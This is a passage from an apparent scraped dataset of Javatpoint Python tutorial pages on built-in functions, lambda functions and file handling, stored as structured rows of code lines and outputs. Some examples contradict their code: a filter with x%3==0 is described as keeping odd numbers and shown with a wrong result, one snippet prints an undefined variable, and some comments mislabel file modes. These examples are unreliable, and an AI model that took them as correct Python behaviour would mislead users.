min(1000.25,2025.35,5625.36,10052.50)', '# Displaying result', 'print(small)', 'print(small2)', '# Calling function', 'result = set() # empty set', ""result2 = set('12')"", ""result3 = set('javatpoint')"", '# Displaying result', 'print(result)', 'print(result2)', 'print(result3)', '# Calling function', 'result = hex(1)', '# integer value', 'result2 = hex(342)', '# Displaying result', 'print(result)', 'print(result2)', '# Calling function', 'val = id(""Javatpoint"") # string object', 'val2 = id(1200) # integer object', 'val3 = id([25,336,95,236,92,3225]) # List object', '# Displaying result', 'print(val)', 'print(val2)', 'print(val3)', 'class Student:', 'id = 0', 'name = """"', 'def __init__(self, id, name):', 'self.id = id', 'self.name = name', '', 'student = Student(102,""Sohan"")', 'print(student.id)', 'print(student.name)', '#print(student.email) product error', ""setattr(student, 'email','sohan@abc.com') # adding new attribute"", 'print(student.email)', '# Calling function', 'result = slice(5) # returns slice object', 'result2 = slice(0,5,3) # returns slice object', '# Displaying result', 'print(result)', 'print(result2)', 'str = ""javatpoint"" # declaring string', '# Calling function', 'sorted1 = sorted(str) # sorting string', '# Displaying result', 'print(sorted1)', 'number = iter([256, 32, 82]) # Creating iterator', '# Calling function', 'item = next(number)', '# Displaying result', 'print(item)', '# second item', 'item = next(number)', 'print(item)', '# third item', 'item = next(number)', 'print(item)', '# Calling function', 'val = input(""Enter a value: "")', '# Displaying result', 'print(""You entered:"",val)', '# Calling function', 'val = int(10) # integer value', 'val2 = int(10.52) # float value', ""val3 = int('10') # string value"", '# Displaying result', 'print(""integer values :"",val, val2, val3)', 'class Student:', 'id = 101', 'name = ""John""', 'def __init__(self, id, name):', 'self.id=id', 'self.name=name', 'student = Student(1010,""John"")', 'lst = [12,34,5,6,767]', '# Calling function', 'print(isinstance(student, Student)) # isinstance of Student class', 'print(isinstance(lst, Student))', '# Calling function', 'val = oct(10)', '# Displaying result', 'print(""Octal value of 10:"",val)', '# Code point of an integer', ""print(ord('8'))"", '# Code point of an alphabet', ""print(ord('R'))"", '# Code point of a character', ""print(ord('&'))"", '# positive x, positive y (x**y)', 'print(pow(4, 2))', '# negative x, positive y', 'print(pow(-4, 2))', '# positive x, negative y (x**-y)', 'print(pow(4, -2))', '# negative x, negative y', 'print(pow(-4, -2))', 'print(""Python is programming language."")', '# Two objects passed', 'print(""x ="", x)', '# Three objects passed', ""print('x =', x, '= y')"", '# empty range', 'print(list(range(0)))', '# using the range(stop)', 'print(list(range(4)))', '# using the range(start, stop)', 'print(list(range(1,7 )))', '# for string', ""String = 'Java'"", 'print(list(reversed(String)))', '# for tuple', ""Tuple = ('J', 'a', 'v', 'a')"", 'print(list(reversed(Tuple)))', '# for range', 'Range = range(8, 12)', 'print(list(reversed(Range)))', '# for list', 'List = [1, 2, 7, 5]', 'print(list(reversed(List)))', '#  for integers', 'print(round(10))', '#  for floating point', 'print(round(10.8))', '#  even choice', 'print(round(6.6))', 'class Rectangle:', 'def __init__(rectangleType):', ""print('Rectangle is a ', rectangleType)"", 'class Square(Rectangle):', 'def __init__(self):', ""Rectangle.__init__('square')"", 'print(issubclass(Square, Rectangle))', 'print(issubclass(Square, list))', 'print(issubclass(Square, (list, Rectangle)))', 'print(issubclass(Rectangle, (list, Rectangle)))', ""str('4')"", 't1 = tuple()', ""print('t1=', t1)"", '# creating a tuple from a list', 't2 = tuple([1, 6, 9])', ""print('t2=', t2)"", '# creating a tuple from a string', ""t1 = tuple('Java')"", ""print('t1=',t1)"", '# creating a tuple from a dictionary', ""t1 = tuple({4: 'four', 5: 'five'})"", ""print('t1=',t1)"", 'List = [4, 5]', 'print(type(List))', ""Dict = {4: 'four', 5: 'five'}"", 'print(type(Dict))', 'class Python:', 'a = 0', 'InstanceOfPython = Python()', 'print(type(InstanceOfPython))', 'class Python:', 'def __init__(self, x = 7, y = 9):', 'self.x = x', 'self.y = y', 'InstanceOfPython = Python()', 'print(vars(InstanceOfPython))', 'numList = [4,5, 6]', ""strList = ['four', 'five', 'six']"", '# No iterables are passed', 'result = zip()', '# Converting itertor to list', 'resultList = list(result)', 'print(resultList)', '# Two iterables are passed', 'result = zip(numList, strList)', '# Converting itertor to set', 'resultSet = set(result)', 'print(resultSet)']","['Absolute value of -20 is: 20\nAbsolute value of -20.83 is: 20.83', 'True\nFalse\nFalse\nFalse\nTrue', '0b1010', '[] is False\n[0] is True\n0.0 is False\nNone is False\nTrue is True\nEasy string is True', ""b ' Hello World.'"", 'False', ""<class 'code'>\nsum = 15"", 'True\n12', '7\n17', 'True\nFalse\nTrue\nFalse', ""'Python is interesting'\n'Pyth\\xf6n is interesting'\nPythön is interesting"", ""bytearray(b'Python is a programming language.')"", '9', ""9.0\n8.19\n-24.27\n-17.19\nValueError: could not convert string to float: 'xyz'"", '123\n123.456790\n1100', ""Frozen set is: frozenset({'o', 'm', 's', 'r', 't'})\nEmpty frozen set is: frozenset()"", 'The age is: 22\nThe age is: 22', 'The age is: 22', 'True\nFalse\nTrue\nFalse', '1\n2\n3\n4\n5', '6', ""[]\n['a', 'b', 'c', 'd', 'e']\n[1,2,3,4,5]\n[1,2,3,4,5]"", ""localsAbsent: {}\nlocalsPresent: {'present': True}"", '<map object at 0x7fb04a6bec18>\n{8, 2, 4, 6}', ""65\nb'AB'\n[65, 66, 67]"", ""<class 'object'>\n['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', \n'__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', \n'__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', \n'__str__', '__subclasshook__']"", ""Since the mode is omitted, the file is opened in 'r' mode; opens for reading."", 'ValueError: chr() arg not in range(0x110000)', '(1.5+0j)\n(1.5+2.2j)', '101 Pranshu [email\xa0protected]\nAttributeError: course', ""['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', \n'__name__', '__package__', '__spec__']"", '(5, 0)', '<enumerate object at 0x7ff641093d80>\n[(0, 1), (1, 2), (2, 3)]', ""{}\n{'a': 1, 'b': 2}"", '[6]', '21\n461168601842737174', ""Welcome to Python 3.5's help utility!"", '325\n1000.25', ""set()\n{'1', '2'}\n{'a', 'n', 'v', 't', 'j', 'p', 'i', 'o'}"", '0x1\n0x156', '139963782059696\n139963805666864\n139963781994504', '102\nSohan\n[email\xa0protected]', 'slice(None, 5, None)\nslice(0, 5, 3)', ""['a', 'a', 'i', 'j', 'n', 'o', 'p', 't', 't', 'v']"", '256\n32\n82', 'Enter a value: 45\nYou entered: 45', 'integer values : 10 10 10', 'True\nFalse', 'Octal value of 10: 0o12', '56\n82\n38', '16\n16\n0.0625\n0.0625', 'Python is programming language.\nx = 7\nx = 7 = y', '[]\n[0, 1, 2, 3]\n[1, 2, 3, 4, 5, 6]', ""['a', 'v', 'a', 'J']\n['a', 'v', 'a', 'J']\n[11, 10, 9, 8]\n[5, 7, 2, 1]"", '10\n11\n7', 'True\nFalse\nTrue\nTrue', ""'4'"", ""t1= ()\nt2= (1, 6, 9)\nt1= ('J', 'a', 'v', 'a')\nt1= (4, 5)"", ""<class 'list'>\n<class 'dict'>\n<class '__main__.Python'>"", ""{'y': 9, 'x': 7}"", ""[]\n{(5, 'five'), (4, 'four'), (6, 'six')}""]",[],"['|||If no argument is passed, it creates an empty dictionary.|||If a positional argument is given, a dictionary is created with the same key-value pairs. Otherwise, pass an iterable object.|||If keyword arguments are given, the keyword arguments and their values are added to the dictionary created from the positional argument.|||']"
27,['Python Lambda Functions'],"['Python Lambda function is known as the anonymous function that is defined without a name. Python allows us to not declare the function in the standard manner, i.e., by using the def keyword. Rather, the anonymous functions are declared by using the lambda keyword. However, Lambda functions can accept any number of arguments, but they can return only one value in the form of expression.']","['https://www.javatpoint.com/python-files-io', 'https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/python-files-io', 'https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/python-files-io']",[],[],['Why use lambda function?'],"['Syntax', 'Example 1', 'Example 2', 'Example 1:', 'Use lambda function with filter()', 'Using lambda function with map()']",[],"['The anonymous function contains a small piece of code. It simulates inline functions of C and C++, but it is not exactly an inline function.', 'The syntax to define an anonymous function is given below.', 'It can accept any number of arguments and has only one expression. It is useful when the function objects are required.', 'Consider the following example of the lambda function.', 'Multiple arguments to Lambda function', 'Consider the following example:', 'The lambda function is commonly used with Python built-in functions filter() function and map() function.', 'Consider the following example where we filter out the only odd number from the given list.', 'Consider the following example of map() function.']","['In the above example, we have defined the lambda a: a+10 anonymous function where a is an argument and a+10 is an expression. The given expression gets evaluated and returned the result. The above lambda function is same as the normal function.', 'The Python built-in filter() function accepts a function and a list as an argument. It provides an effective way to filter out all elements of the sequence. It returns the new sequence in which the function evaluates to True.', 'The map() function in Python accepts a function and a list. It gives a new list which contains all modified items returned by the function for each item.']","['The main role of the lambda function is better described in the scenarios when we use them anonymously inside another function. In Python, the lambda function can be used as an argument to the higher-order functions which accepts other functions as arguments.']","['lambda arguments: expression', '# a is an argument and a+10 is an expression which got evaluated and returned.', 'x = lambda a:a+10', '# Here we are printing the function object', 'print(x)', 'print(""sum = "",x(20))', 'def x(a):', 'return a+10', 'print(sum = x(10))', '# a and b are the arguments and a*b is the expression which gets evaluated and returned.', 'x = lambda a,b: a*b', 'print(""mul = "", x(20,10))', 'mul =  200', 'Why use lambda function?', 'The main role of the lambda function is better described in the scenarios when we use them anonymously inside another function. In Python, the lambda function can be used as an argument to the higher-order functions which accepts other functions as arguments.', 'Consider the following example:', 'Example 1:', '#the function table(n) prints the table of n', 'def table(n):', 'return lambda a:a*n # a will contain the iteration variable i and a multiple of n is returned at each function call', 'n = int(input(""Enter the number:""))', 'b = table(n) #the entered number is passed into the function table. b will contain a lambda function which is called again and again with the iteration variable i', 'for i in range(1,11):', 'print(n,""X"",i,""="",b(i)) #the lambda function b is called with the iteration variable i', 'Enter the number:10', '10 X 1 = 10', '10 X 2 = 20', '10 X 3 = 30', '10 X 4 = 40', '10 X 5 = 50', '10 X 6 = 60', '10 X 7 = 70', '10 X 8 = 80', '10 X 9 = 90', '10 X 10 = 100', 'The lambda function is commonly used with Python built-in functions filter() function and map() function.', 'Use lambda function with filter()', 'The Python built-in filter() function accepts a function and a list as an argument. It provides an effective way to filter out all elements of the sequence. It returns the new sequence in which the function evaluates to True.', 'Consider the following example where we filter out the only odd number from the given list.', '#program to filter out the tuple which contains odd numbers', 'lst = (10,22,37,41,100,123,29)', 'oddlist = tuple(filter(lambda x:(x%3 == 0),lst)) # the tuple contains all the items of the tuple for which the lambda function evaluates to true', 'print(oddlist)', '(37, 41, 123, 29)', 'Using lambda function with map()', 'The map() function in Python accepts a function and a list. It gives a new list which contains all modified items returned by the function for each item.', 'Consider the following example of map() function.', '#program to filter out the list which contains odd numbers', 'lst = (10,20,30,40,50,60)', 'square_list = list(map(lambda x:x**2,lst)) # the tuple contains all the items of the list for which the lambda function evaluates to true', 'print(square_tuple)', '(100, 400, 900, 1600, 2500, 3600)', 'Next TopicPython Files Io', '#the function table(n) prints the table of n', 'def table(n):', 'return lambda a:a*n # a will contain the iteration variable i and a multiple of n is returned at each function call', 'n = int(input(""Enter the number:""))', 'b = table(n) #the entered number is passed into the function table. b will contain a lambda function which is called again and again with the iteration variable i', 'for i in range(1,11):', 'print(n,""X"",i,""="",b(i)) #the lambda function b is called with the iteration variable i', '#program to filter out the tuple which contains odd numbers', 'lst = (10,22,37,41,100,123,29)', 'oddlist = tuple(filter(lambda x:(x%3 == 0),lst)) # the tuple contains all the items of the tuple for which the lambda function evaluates to true', 'print(oddlist)', '#program to filter out the list which contains odd numbers', 'lst = (10,20,30,40,50,60)', 'square_list = list(map(lambda x:x**2,lst)) # the tuple contains all the items of the list for which the lambda function evaluates to true', 'print(square_tuple)']","['<function <lambda> at 0x0000019E285D16A8>\nsum =  30', 'mul =  200', 'Enter the number:10\n10 X 1 = 10 \n10 X 2 = 20\n10 X 3 = 30\n10 X 4 = 40\n10 X 5 = 50\n10 X 6 = 60\n10 X 7 = 70\n10 X 8 = 80\n10 X 9 = 90\n10 X 10 = 100', '(37, 41, 123, 29)', '(100, 400, 900, 1600, 2500, 3600)']",[],[]
28,['Python File Handling'],"['Till now, we were taking the input from the console and writing it back to the console to interact with the user.']","['https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/python-lambda-functions', 'https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/python-lambda-functions', 'https://www.javatpoint.com/python-modules']","['https://static.javatpoint.com/python/images/python-file-handling.png', 'https://static.javatpoint.com/python/images/python-file-handling2.png']",[],"['Opening a file ', 'The close() method', 'The with statement', 'Writing the file', 'Read Lines of the file', 'Creating a new file', 'File Pointer positions', 'Modifying file pointer position', 'Python OS module', 'Creating the new directory', 'The getcwd() method', 'Changing the current working directory', 'Deleting directory', 'Writing Python output to the files', 'The file related methods ']","['Example', 'Example', 'Example 2', 'Example', 'Read file through for loop', 'Example 1: Reading lines using readline() function', 'Example 2: Reading Lines Using readlines() function', 'Example 1', 'Example', 'Renaming the file', 'Removing the file', 'Example']",[],"['The file-handling implementation is slightly lengthy or complicated in the other programming language, but it is easier and shorter in Python.', 'Hence, a file operation can be done in the following order.', 'The files can be accessed using various modes like read, write, or append. The following are the details about the access mode to open a file.', 'Let\'s look at the simple example to open a file named ""file.txt"" (stored in the same directory) in read mode and printing its content on the console.', 'The syntax to use the close() method is given below.', 'We should use the following method to overcome such type of problem.', 'The syntax to open a file using with the statement is given below.', 'The advantage of using with statement is that it provides the guarantee to close the file regardless of how the nested block exits.', 'Consider the following example.', 'To write some text to a file, we need to open the file using the open method with one of the following access modes.', 'w: It will overwrite the file if any file exists. The file pointer is at the beginning of the file.', 'a: It will append the existing file. The file pointer is at the end of the file. It creates a new file if no file exists.', 'Consider the following example.', 'Snapshot of the file2.txt', 'Snapshot of the file2.txt', 'We can see that the content of the file is modified. We have opened the file in a mode and it appended the content in the existing file2.txt.', 'The syntax of the read() method is given below.', 'Consider the following example.', 'If we use the following line, then it will print all content of the file.', 'We can read the file using for loop. Consider the following example.', ""We called the readline() function two times that's why it read two lines from the file."", 'The new file can be created by using one of the following access modes with the function open().', 'x: it creates a new file with the specified name. It causes an error a file exists with the same name.', 'w: It creates a new file with the specified name if no such file exists. It overwrites the existing file.', 'Consider the following example.', 'Python provides the tell() method which is used to print the byte number at which the file pointer currently exists. Consider the following example.', 'For this purpose, the Python provides us the seek() method which enables us to modify the file pointer position externally.', 'The syntax to use the seek() method is given below.', 'The seek() method accepts two parameters:', 'offset: It refers to the new position of the file pointer within the file.', 'Consider the following example.', 'The first argument is the current file name and the second argument is the modified name. We can change the file name bypassing these two arguments.', 'Example 1:', 'The above code renamed current file2.txt to file3.txt', 'The os module provides the remove() method which is used to remove the specified file. The syntax to use the remove() method is given below.', 'The mkdir() method is used to create the directories in the current working directory. The syntax to create the new directory is given below.', 'This method returns the current working directory.', 'The syntax to use the getcwd() method is given below.', 'The chdir() method is used to change the current working directory to a specified directory.', 'The syntax to use the chdir() method is given below.', 'The rmdir() method is used to delete the specified directory.', 'The syntax to use the rmdir() method is given below.', 'It will remove the specified directory.', 'In Python, there are the requirements to write the output of a Python script to a file.', 'The check_call() method of module subprocess is used to execute a Python script and write the output of that script to a file.', 'The following example contains two python scripts. The script file1.py executes the script file.py and writes its output to the text file output.txt.', 'The file object provides the following methods to manipulate the files on various operating systems.']","['The file handling plays an important role when the data needs to be stored permanently into the file. A file is a named location on disk to store related information. We can access the stored information (non-volatile) after the program termination.', 'In Python, files are treated in two modes as text or binary. The file may be in the text or binary format, and each line of a file is ended with the special character.', 'Python provides an open() function that accepts two arguments, file name and access mode in which the file is accessed. The function returns a file object which can be used to perform various operations like reading, writing, etc.', 'In the above code, we have passed filename as a first argument and opened file in read mode as we mentioned r as the second argument. The fileptr holds the file object and if the file is opened successfully, it will execute the print statement', 'Once all the operations are done on the file, we must close it through our Python script using the close() method. Any unwritten information gets destroyed once the close() method is called on a file object.', 'We can perform any operation on the file externally using the file system which is the currently opened in Python; hence it is good practice to close the file once all the operations are done.', 'After closing the file, we cannot perform any operation in the file. The file needs to be properly closed. If any exception occurs while performing some operations in the file then the program terminates without closing the file.', 'The with statement was introduced in python 2.5. The with statement is useful in the case of manipulating the files. It is used in the scenario where a pair of statements is to be executed with a block of code in between.', ""We have opened the file in w mode. The file1.txt file doesn't exist, it created a new file and we have written the content in the file using the write() function."", 'To read a file using the Python script, the Python provides the read() method. The read() method reads a string from the file. It can read the data in the text as well as a binary format.', 'Here, the count is the number of bytes to be read from the file starting from the beginning of the file. If the count is not specified, then it may read the content of the file until the end.', 'In the above code, we have read the content of file2.txt by using the read() function. We have passed count value as ten which means it will read the first ten characters from the file.', 'Consider the following example which contains a function readline() that reads the first line of our file ""file2.txt"" containing three lines. Consider the following example.', 'Python provides also the readlines() method which is used for the reading lines. It returns the list of the lines till the end of file(EOF) is reached.', 'a: It creates a new file with the specified name if no such file exists. It appends the content to the file if the file already exists with the specified name.', 'In real-world applications, sometimes we need to change the file pointer location externally since we may need to read or write the content at various locations.']","['Sometimes, it is not enough to only display the data on the console. The data to be displayed may be very large, and only a limited amount of data can be displayed on the console since the memory is volatile, it is impossible to recover the programmatically generated data again and again.', 'Consider the following example.\n\n# opens the file file.txt in read mode  \nfileptr = open(""file.txt"",""r"")  \n  \nif fileptr:  \n    print(""file is opened successfully"")  \n  \n#closes the opened file  \nfileptr.close()\n\nAfter closing the file, we cannot perform any operation in the file. The file needs to be properly closed. If any exception occurs while performing some operations in the file then the program terminates without closing the file.\nWe should use the following method to overcome such type of problem.\n\ntry:\n   fileptr = open(""file.txt"")\n   # perform file operations\nfinally:\n   fileptr.close()\n\nThe with statement\nThe with statement was introduced in python 2.5. The with statement is useful in the case of manipulating the files. It is used in the scenario where a pair of statements is to be executed with a block of code in between.\nThe syntax to open a file using with the statement is given below.\n\nwith open(<file name>, <access mode>) as <file-pointer>:  \n    #statement suite   \n\nThe advantage of using with statement is that it provides the guarantee to close the file regardless of how the nested block exits.\nIt is always suggestible to use the with statement in the case of files because, if the break, return, or exception occurs in the nested block of code then it automatically closes the file, we don\'t need to write the close() function. It doesn\'t let the file to corrupt.\nConsider the following example.\nExample\n\nwith open(""file.txt"",\'r\') as f:  \n    content = f.read();  \n    print(content)  \n\nWriting the file\nTo write some text to a file, we need to open the file using the open method with one of the following access modes.\nw: It will overwrite the file if any file exists. The file pointer is at the beginning of the file.\na: It will append the existing file. The file pointer is at the end of the file. It creates a new file if no file exists.\nConsider the following example.\nExample\n\n# open the file.txt in append mode. Create a new file if no such file exists.\nfileptr = open(""file2.txt"", ""w"")\n\n# appending the content to the file\nfileptr.write(\'\'\'Python is the modern day language. It makes things so simple.\nIt is the fastest-growing programing language\'\'\')\n\n# closing the opened the file\nfileptr.close()\n\nOutput:\nFile2.txt\nPython is the modern-day language. It makes things so simple. It is the fastest growing programming language.\n\nSnapshot of the file2.txt\n\nWe have opened the file in w mode. The file1.txt file doesn\'t exist, it created a new file and we have written the content in the file using the write() function.\nExample 2\n\n#open the file.txt in write mode.  \nfileptr = open(""file2.txt"",""a"")\n  \n#overwriting the content of the file  \nfileptr.write("" Python has an easy syntax and user-friendly interaction."")  \n    \n#closing the opened file   \nfileptr.close()\n\nOutput:\nPython is the modern day language. It makes things so simple.\nIt is the fastest growing programing language Python has an easy syntax and user-friendly interaction.\n\nSnapshot of the file2.txt\n\nWe can see that the content of the file is modified. We have opened the file in a mode and it appended the content in the existing file2.txt.\nTo read a file using the Python script, the Python provides the read() method. The read() method reads a string from the file. It can read the data in the text as well as a binary format.\nThe syntax of the read() method is given below.\nSyntax:\n\nfileobj.read(<count>)  \n\nHere, the count is the number of bytes to be read from the file starting from the beginning of the file. If the count is not specified, then it may read the content of the file until the end.\nConsider the following example.\nExample\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""r"")\n#stores all the data of the file into the variable content  \ncontent = fileptr.read(10) \n# prints the type of the data stored in the file  \nprint(type(content))    \n#prints the content of the file  \nprint(content)     \n#closes the opened file  \nfileptr.close()  \n\nOutput:\n<class \'str\'>\nPython is \n\nIn the above code, we have read the content of file2.txt by using the read() function. We have passed count value as ten which means it will read the first ten characters from the file.\nIf we use the following line, then it will print all content of the file.\n\ncontent = fileptr.read()\nprint(content) \n\nOutput:\nPython is the modern-day language. It makes things so simple.\nIt is the fastest-growing programing language Python has easy an syntax and user-friendly interaction.\n\nRead file through for loop\nWe can read the file using for loop. Consider the following example.\n\n#open the file.txt in read mode. causes an error if no such file exists.  \nfileptr = open(""file2.txt"",""r"");   \n#running a for loop   \nfor i in fileptr:  \n    print(i) # i contains each line of the file   \n\nOutput:\nPython is the modern day language.\n\nIt makes things so simple.\n\nPython has easy syntax and user-friendly interaction.\n\nRead Lines of the file\nPython facilitates to read the file line by line by using a function readline() method. The readline() method reads the lines of the file from the beginning, i.e., if we use the readline() method two times, then we can get the first two lines of the file.\nConsider the following example which contains a function readline() that reads the first line of our file ""file2.txt"" containing three lines. Consider the following example.\nExample 1: Reading lines using readline() function\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""r"");   \n#stores all the data of the file into the variable content  \ncontent = fileptr.readline()   \ncontent1 = fileptr.readline()\n#prints the content of the file  \nprint(content)   \nprint(content1)\n#closes the opened file  \nfileptr.close()  \n\nOutput:\nPython is the modern day language.\n\nIt makes things so simple.\n\nWe called the readline() function two times that\'s why it read two lines from the file.\nPython provides also the readlines() method which is used for the reading lines. It returns the list of the lines till the end of file(EOF) is reached.\nExample 2: Reading Lines Using readlines() function\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""r"");   \n  \n#stores all the data of the file into the variable content  \ncontent = fileptr.readlines()   \n\n#prints the content of the file  \nprint(content)   \n  \n#closes the opened file  \nfileptr.close()  \n\nOutput:\n[\'Python is the modern day language.\\n\', \'It makes things so simple.\\n\', \'Python has easy syntax and user-friendly interaction.\']\n\nCreating a new file\nThe new file can be created by using one of the following access modes with the function open().\nx: it creates a new file with the specified name. It causes an error a file exists with the same name.\na: It creates a new file with the specified name if no such file exists. It appends the content to the file if the file already exists with the specified name.\nw: It creates a new file with the specified name if no such file exists. It overwrites the existing file.\nConsider the following example.\nExample 1\n\n#open the file.txt in read mode. causes error if no such file exists.  \nfileptr = open(""file2.txt"",""x"") \nprint(fileptr)  \nif fileptr:  \n    print(""File created successfully"")\n\nOutput:\n<_io.TextIOWrapper name=\'file2.txt\' mode=\'x\' encoding=\'cp1252\'>\nFile created successfully \n\nFile Pointer positions\nPython provides the tell() method which is used to print the byte number at which the file pointer currently exists. Consider the following example.\n\n# open the file file2.txt in read mode  \nfileptr = open(""file2.txt"",""r"")  \n\n#initially the filepointer is at 0   \nprint(""The filepointer is at byte :"",fileptr.tell())  \n  \n#reading the content of the file  \ncontent = fileptr.read();  \n  \n#after the read operation file pointer modifies. tell() returns the location of the fileptr.   \n  \nprint(""After reading, the filepointer is at:"",fileptr.tell())  \n\nOutput:\nThe filepointer is at byte : 0\nAfter reading, the filepointer is at: 117\n\nModifying file pointer position\nIn real-world applications, sometimes we need to change the file pointer location externally since we may need to read or write the content at various locations.\nFor this purpose, the Python provides us the seek() method which enables us to modify the file pointer position externally.\nThe syntax to use the seek() method is given below.\nSyntax:\n\n<file-ptr>.seek(offset[, from)  \n\nThe seek() method accepts two parameters:\noffset: It refers to the new position of the file pointer within the file.\nfrom: It indicates the reference position from where the bytes are to be moved. If it is set to 0, the beginning of the file is used as the reference position. If it is set to 1, the current position of the file pointer is used as the reference position. If it is set to 2, the end of the file pointer is used as the reference position.\nConsider the following example.\nExample\n\n# open the file file2.txt in read mode  \nfileptr = open(""file2.txt"",""r"")  \n  \n#initially the filepointer is at 0   \nprint(""The filepointer is at byte :"",fileptr.tell())  \n  \n#changing the file pointer location to 10.  \nfileptr.seek(10);  \n  \n#tell() returns the location of the fileptr.   \nprint(""After reading, the filepointer is at:"",fileptr.tell())  \n\nOutput:\nThe filepointer is at byte : 0\nAfter reading, the filepointer is at: 10\n\nPython OS module\nRenaming the file\nThe Python os module enables interaction with the operating system. The os module provides the functions that are involved in file processing operations like renaming, deleting, etc. It provides us the rename() method to rename the specified file to a new name. The syntax to use the rename() method is given below.\nSyntax:\n\nrename(current-name, new-name)  \n\nThe first argument is the current file name and the second argument is the modified name. We can change the file name bypassing these two arguments.\nExample 1:\n\nimport os  \n  \n#rename file2.txt to file3.txt  \nos.rename(""file2.txt"",""file3.txt"")\n\nOutput:\n\n\nThe above code renamed current file2.txt to file3.txt\nRemoving the file\nThe os module provides the remove() method which is used to remove the specified file. The syntax to use the remove() method is given below.\n\nremove(file-name) \n\nExample 1\n\nimport os;  \n#deleting the file named file3.txt   \nos.remove(""file3.txt"")  \n\nCreating the new directory\nThe mkdir() method is used to create the directories in the current working directory. The syntax to create the new directory is given below.\nSyntax:\n\nmkdir(directory name)\n\nExample 1\n\nimport os  \n  \n#creating a new directory with the name new  \nos.mkdir(""new"")  \n\nThe getcwd() method\nThis method returns the current working directory.\nThe syntax to use the getcwd() method is given below.\nSyntax\n\nos.getcwd()\n\nExample\n\nimport os\nos.getcwd()\n\nOutput:\n\'C:\\\\Users\\\\DEVANSH SHARMA\'\n\nChanging the current working directory\nThe chdir() method is used to change the current working directory to a specified directory.\nThe syntax to use the chdir() method is given below.\nSyntax\n\nchdir(""new-directory"")  \n\nExample\n\nimport os \n# Changing current directory with the new directiory\nos.chdir(""C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents"")\n#It will display the current working directory\nos.getcwd()\n\nOutput:\n\'C:\\\\Users\\\\DEVANSH SHARMA\\\\Documents\'\n\nDeleting directory\nThe rmdir() method is used to delete the specified directory.\nThe syntax to use the rmdir() method is given below.\nSyntax\n\nos.rmdir(directory name)  \n\nExample 1\n\nimport os\n#removing the new directory   \nos.rmdir(""directory_name"")  \n\nIt will remove the specified directory.\nWriting Python output to the files\nIn Python, there are the requirements to write the output of a Python script to a file.\nThe check_call() method of module subprocess is used to execute a Python script and write the output of that script to a file.\nThe following example contains two python scripts. The script file1.py executes the script file.py and writes its output to the text file output.txt.\nExample\nfile.py\n\ntemperatures=[10,-20,-289,100]  \ndef c_to_f(c):  \n    if c< -273.15:  \n        return ""That temperature doesn\'t make sense!""  \n    else:  \n        f=c*9/5+32  \n        return f  \nfor t in temperatures:  \n    print(c_to_f(t))  \n\nfile.py\n\nimport subprocess  \n  \nwith open(""output.txt"", ""wb"") as f:  \n    subprocess.check_call([""python"", ""file.py""], stdout=f)  \n\nThe file related methods \nThe file object provides the following methods to manipulate the files on various operating systems.\n\n\nSN\nMethod\nDescription\n\n\n1\nfile.close()\nIt closes the opened file. The file once closed, it can\'t be read or write anymore.\n\n\n2\nFile.fush()\nIt flushes the internal buffer.\n\n\n3\nFile.fileno()\nIt returns the file descriptor used by the underlying implementation to request I/O from the OS.\n\n\n4\nFile.isatty()\nIt returns true if the file is connected to a TTY device, otherwise returns false.\n\n\n5\nFile.next()\nIt returns the next line from the file.\n\n\n6\nFile.read([size])\nIt reads the file for the specified size.\n\n\n7\nFile.readline([size])\nIt reads one line from the file and places the file pointer to the beginning of the new line.\n\n\n8\nFile.readlines([sizehint])\nIt returns a list containing all the lines of the file. It reads the file until the EOF occurs using readline() function.\n\n\n9\nFile.seek(offset[,from)\nIt modifies the position of the file pointer to a specified offset with the specified reference.\n\n\n10\nFile.tell()\nIt returns the current position of the file pointer within the file.\n\n\n11\nFile.truncate([size])\nIt truncates the file to the optional specified size.\n\n\n12\nFile.write(str)\nIt writes the specified string to a file\n\n\n13\nFile.writelines(seq)\nIt writes a sequence of the strings to a file.\n\n\n\n\nNext TopicPython Modules\n\n\n\n← prev\nnext →\n\n\n', '\n\n# opens the file file.txt in read mode  \nfileptr = open(""file.txt"",""r"")  \n  \nif fileptr:  \n    print(""file is opened successfully"")  \n  \n#closes the opened file  \nfileptr.close()\n\nAfter closing the file, we cannot perform any operation in the file. The file needs to be properly closed. If any exception occurs while performing some operations in the file then the program terminates without closing the file.\nWe should use the following method to overcome such type of problem.\n\ntry:\n   fileptr = open(""file.txt"")\n   # perform file operations\nfinally:\n   fileptr.close()\n\nThe with statement\nThe with statement was introduced in python 2.5. The with statement is useful in the case of manipulating the files. It is used in the scenario where a pair of statements is to be executed with a block of code in between.\nThe syntax to open a file using with the statement is given below.\n\nwith open(<file name>, <access mode>) as <file-pointer>:  \n    #statement suite   \n\nThe advantage of using with statement is that it provides the guarantee to close the file regardless of how the nested block exits.\nIt is always suggestible to use the with statement in the case of files because, if the break, return, or exception occurs in the nested block of code then it automatically closes the file, we don\'t need to write the close() function. It doesn\'t let the file to corrupt.\nConsider the following example.\nExample\n\nwith open(""file.txt"",\'r\') as f:  \n    content = f.read();  \n    print(content)  \n\nWriting the file\nTo write some text to a file, we need to open the file using the open method with one of the following access modes.\nw: It will overwrite the file if any file exists. The file pointer is at the beginning of the file.\na: It will append the existing file. The file pointer is at the end of the file. It creates a new file if no file exists.\nConsider the following example.\nExample\n\n# open the file.txt in append mode. Create a new file if no such file exists.\nfileptr = open(""file2.txt"", ""w"")\n\n# appending the content to the file\nfileptr.write(\'\'\'Python is the modern day language. It makes things so simple.\nIt is the fastest-growing programing language\'\'\')\n\n# closing the opened the file\nfileptr.close()\n\nOutput:\nFile2.txt\nPython is the modern-day language. It makes things so simple. It is the fastest growing programming language.\n\nSnapshot of the file2.txt\n\nWe have opened the file in w mode. The file1.txt file doesn\'t exist, it created a new file and we have written the content in the file using the write() function.\nExample 2\n\n#open the file.txt in write mode.  \nfileptr = open(""file2.txt"",""a"")\n  \n#overwriting the content of the file  \nfileptr.write("" Python has an easy 